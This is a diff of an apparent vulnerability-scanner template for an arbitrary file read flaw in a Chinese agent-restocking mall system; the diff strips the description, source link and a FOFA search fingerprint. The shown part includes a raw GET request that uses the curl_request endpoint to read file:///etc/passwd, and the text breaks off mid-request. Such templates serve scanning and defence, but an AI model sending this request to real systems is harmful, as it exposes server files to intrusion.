@@ -3,12 +3,8 @@ info:
   name: 微商代理商补货商城系统存在前台curl_request任意文件读取漏洞
   author: hacktwo
   severity: high
-  description: '来源: 语雀漏洞知识库 https://www.yuque.com/hacktwo/dtdx2v/nx86supt46ufzqfk'
+  description: ''
   tags: lfi,2025
-  metadata:
-    source: yuque-hacktwo-dtdx2v
-    doc-slug: nx86supt46ufzqfk
-    fofa: '"/template/mobile/new/static/assets/js/comm.js"'
 http:
 - raw:
   - 'GET /Mobile/address/curl_request?url=file:///etc/passwd HTTP/1.1
